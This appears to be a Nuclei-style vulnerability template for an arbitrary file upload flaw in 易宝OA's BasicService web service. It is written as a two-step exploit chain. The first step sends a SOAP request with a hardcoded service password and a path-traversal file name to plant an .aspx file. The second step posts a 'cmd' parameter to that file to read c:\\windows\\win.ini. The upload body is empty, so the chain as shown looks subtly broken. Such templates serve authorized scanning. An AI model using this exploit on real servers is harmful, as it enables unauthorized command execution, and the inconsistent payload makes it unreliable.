id: poc-yaml-yee-pay-oa-BasicService-rce
info:
  name: 易宝OA BasicService Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    易宝OA BasicService contains an arbitrary file upload vulnerability that can be exploited to execute commands on the server.

variables:
  name: "{{rand_base(6)}}"

flow: http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "/WebService/BasicService.asmx"
    headers:
      Content-Type: text/xml; charset=utf-8
    body: |
      <?xml version="1.0" encoding="utf-8"?>
      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
      <UploadPersonalFile xmlns="http://tempuri.org/">
      <fs></fs>
      <FileName>../../manager/{{name}}.aspx</FileName>
      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
      </UploadPersonalFile>
      </soap:Body>
      </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<soap:Body>"
      - type: word
        part: header
        words:
          - "text/xml"

  - id: execute-file
    method: POST
    path:
      - "/{{name}}.aspx"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: | 
      cmd=type c:\\windows\\win.ini
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "for 16-bit app support"
          - "[fonts]"
          - "[Mail]"
